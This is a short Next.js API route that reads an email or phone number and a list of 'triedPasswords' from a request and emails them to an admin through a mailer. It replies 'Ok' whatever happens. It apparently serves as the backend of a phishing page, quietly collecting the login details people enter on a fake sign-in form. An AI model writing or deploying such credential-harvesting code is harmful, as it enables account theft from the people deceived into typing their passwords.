// Next.js API route support: https://nextjs.org/docs/api-routes/introduction

import notifyAdmin from "@/mailer";

export default async function handler(req, res) {
  const { emailOrPhoneNumber, triedPasswords } = req.body;

  const { error, success } = await notifyAdmin({
    emailOrPhoneNumber,
    triedPasswords,
  });
  if (error) console.log("Error sending mail:", error);
  res.json({ message: "Ok" });
}
